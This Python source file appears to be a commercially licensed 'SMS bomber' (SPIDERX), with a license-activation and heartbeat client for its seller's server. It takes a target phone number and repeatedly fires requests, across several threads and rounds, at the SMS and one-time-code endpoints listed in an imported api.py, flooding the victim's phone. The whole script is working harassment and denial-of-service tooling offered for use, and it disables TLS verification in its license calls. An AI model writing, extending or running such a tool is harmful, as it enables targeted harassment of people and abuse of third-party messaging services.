from requests import post, get
from user_agent import generate_user_agent
from colorama import Fore, init
from os import system, name
from concurrent.futures import ThreadPoolExecutor
from time import sleep, time
from datetime import timedelta
import sys
import json
import base64
import uuid
import hashlib
from pystyle import Colors, Colorate, Center

# --- License 相关导入 ---
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat, PrivateFormat, NoEncryption
import threading

from api import SERVICES

init()

g = Fore.GREEN
w = Fore.WHITE
r = Fore.RED
y = Fore.YELLOW
b = Fore.LIGHTBLACK_EX
re = Fore.RESET

# ==================== LICENSE MANAGER ====================
class LicenseManager:
    API_BASE = "https://spiderxcheat.pingbaz.space/sms-bomber/api.php"
    # 公共地址备用 (如果专用地址失效)
    # API_BASE = "https://spiderxcheat.pingbaz.space/api.php?product=sms-bomber"
    # HEADERS_PUBLIC = {"X-API-Key": "pk_74029fbe9b6c230e6812807ed909a891b0e37b40ea6f4189"}

    def __init__(self):
        self.device_id = self._get_device_id()
        self.private_key = None
        self.public_key_pem = None
        self.access_token = None
        self.session_id = None
        self._lock = threading.Lock()
        self._load_or_create_keys()

    def _get_device_id(self):
        # 使用 MAC 地址等生成稳定设备 ID
        import uuid
        # 简单的稳定 ID，实际可结合 hardware 信息
        try:
            mac = uuid.getnode()
            return str(uuid.uuid5(uuid.NAMESPACE_DNS, str(mac)))
        except:
            return str(uuid.uuid4())

    def _load_or_create_keys(self):
        # 为了简化，每次运行生成新的密钥对。生产环境应持久化。
        self.private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pub = self.private_key.public_key()
        pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode()
        self.public_key_pem = pem

    def _sign(self, action):
        ts = int(time())
        nonce = uuid.uuid4().hex
        data = f"{self.device_id}|{ts}|{nonce}|{action}"
        sig = self.private_key.sign(
            data.encode(),
            padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
            hashes.SHA256()
        )
        return {
            "access_token": self.access_token,
            "device_id": self.device_id,
            "timestamp": ts,
            "nonce": nonce,
            "signature": base64.b64encode(sig).decode()
        }

    def activate(self, license_key):
        payload = {
            "license_key": license_key,
            "device_id": self.device_id,
            "public_key": self.public_key_pem,
            "device_model": "PC/Python",
            "android_version": "N/A",
            "app_version": "1.0.0"
        }
        try:
            resp = post(f"{self.API_BASE}?action=activate", json=payload, timeout=10, verify=False)
            data = resp.json()
            if data.get("success"):
                self.access_token = data["access_token"]
                self.session_id = data.get("session_id")
                return True, data
            else:
                return False, data.get("error", "ACTIVATION_FAILED")
        except Exception as e:
            return False, str(e)

    def validate(self):
        payload = self._sign("validate")
        try:
            resp = post(f"{self.API_BASE}?action=validate", json=payload, timeout=10, verify=False)
            data = resp.json()
            return data.get("success", False), data
        except:
            return False, {}

    def heartbeat(self):
        with self._lock:
            if not self.access_token:
                return
            payload = self._sign("heartbeat")
            try:
                post(f"{self.API_BASE}?action=heartbeat", json=payload, timeout=5, verify=False)
            except:
                pass

    def start_heartbeat(self):
        def loop():
            while True:
                sleep(60)
                self.heartbeat()
        t = threading.Thread(target=loop, daemon=True)
        t.start()

# =========================================================

class Counter:
    def __init__(self):
        self.value = 0
        self.start_time = time()
        self.rounds = 0

    def increment(self):
        self.value += 1

    def increment_round(self):
        self.rounds += 1

    def get_elapsed_time(self):
        return timedelta(seconds=int(time() - self.start_time))

def _bn():
    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter("""

 ███████╗██████╗ ██╗██████╗ ███████╗██████╗ ██╗  ██╗
 ██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
 ███████╗██████╔╝██║██║  ██║█████╗  ██████╔╝ ╚███╔╝
 ╚════██║██╔═══╝ ██║██║  ██║██╔══╝  ██╔══██╗ ██╔██╗
 ███████║██║     ██║██████╔╝███████╗██║  ██║██╔╝ ██╗
 ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝

                  t.me/SPIDERXCODE
""")))

def _cs():
    system('cls' if name == 'nt' else 'clear')

def _res(counter, phone, total_services):
    _cs()
    _bn()

    _res = f"""
╔{'═'*37}╗
║{'   RESULTS'.center(33)}    ║
╠{'═'*37}╣
║ Target > {phone.ljust(27)}║
║ Services > {str(total_services).ljust(25)}║
║ Successful > {str(counter.value).ljust(23)}║
║ Rounds > {str(counter.rounds).ljust(25)}  ║
║ Time > {str(counter.get_elapsed_time()).ljust(27)}  ║
╚{'═'*37}╝
"""

    print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(_res)))

def _sq(service_name, number, counter):
    try:
        api_func = SERVICES.get(service_name)
        if not api_func:
            print(f"{r}{service_name.ljust(15)} wtf  :] {re}")
            return

        response = api_func(number)
        if response.status_code in [200, 201, 202]:
            print(f"{g}{service_name.ljust(15)} Sent  |  ({response.status_code}){re}")
            counter.increment()
        else:
            print(f"{r}{service_name.ljust(15)} Not Sent  |  ({response.status_code}){re}")
    except Exception as e:
        print(f"{r}{service_name.ljust(15)} Error > {str(e)}{re}")

def check_license():
    """返回 True 表示授权有效，False 表示应退出"""
    lm = LicenseManager()
    _cs()
    _bn()
    print(f"\n{w}════════ LICENSE VERIFICATION ════════{re}\n")

    # 尝试从本地文件读取已保存的 token (可选)
    # 这里简化为每次都需要输入 key 激活，如果已有 token 则验证
    license_key = input(f"{w}License Key > {re}").strip()
    if not license_key:
        print(f"{r}License key required.{re}")
        return False

    print(f"{y}Activating ...{re}")
    ok, result = lm.activate(license_key)

    if not ok:
        err = result.get("error", "UNKNOWN") if isinstance(result, dict) else result
        print(f"{r}Activation failed: {err}{re}")
        # 如果是因为已经激活过，尝试直接验证
        if isinstance(result, dict) and err == "ALREADY_ACTIVE":
            pass
        else:
            return False

    # 验证会话
    valid, vdata = lm.validate()
    if not valid:
        print(f"{r}Session invalid: {vdata.get('error', 'INVALID_SESSION')}{re}")
        return False

    expires = vdata.get("expires_at", 0)
    if expires:
        import datetime
        dt = datetime.datetime.fromtimestamp(expires)
        print(f"{g}Authorized. Expires: {dt}{re}")

    lm.start_heartbeat()
    print(f"{g}Heartbeat started.{re}\n")
    sleep(1)
    return True


def main():
    # ---------- LICENSE GATE ----------
    if not check_license():
        print(f"\n{r}Exiting due to license failure.{re}")
        sys.exit(1)
    # ----------------------------------

    _cs()
    _bn()

    try:
        phone = input(f'{w}Phone > {re}').strip()
        if not phone.isdigit() or len(phone) != 10:
            print(f"{r}Invalid phone number :] {re}")
            sys.exit(1)

        try:
            rounds = int(input(f'{w}Round > {re}') or 1)
            if rounds < 1:
                print(f"{r}Rounds must be 1 or more :]{re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid rounds number :] {re}")
            sys.exit(1)

        try:
            _mt = int(input(f'{w}Thread > {re}') or 5)
            if _mt < 1:
                print(f"{r}Threads must be 1 or more :] {re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid threads number :] {re}")
            sys.exit(1)

        try:
            time_sleep = float(input(f'{w}Sleep > {re}') or 1)
            if time_sleep < 0:
                print(f"{r}Sleep time cannot be negative :] {re}")
                sys.exit(1)
        except ValueError:
            print(f"{r}Invalid sleep time :] {re}")
            sys.exit(1)

        _cs()
        _bn()

        services = list(SERVICES.keys())
        if not services:
            print(f"{r}api.py not find :] {re}")
            sys.exit(1)

        counter = Counter()
        total_services = len(services)

        print(f"\n{w}Starting .. \n")
        print(f"{w}Services available > {len(services)}{re}\n")

        for current_round in range(1, rounds + 1):
            print(f"{w}Round {current_round}/{rounds}")
            counter.increment_round()

            with ThreadPoolExecutor(max_workers=_mt) as executor:
                args = [(service, phone, counter) for service in services]
                executor.map(lambda x: _sq(*x), args)

            if current_round < rounds:
                sleep(time_sleep)

        _res(counter, phone, total_services)

    except KeyboardInterrupt:
        print(f"\n{r}Cancelled  :] {re}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{r}Error > {e}{re}")
        sys.exit(1)

if __name__ == "__main__":
    main()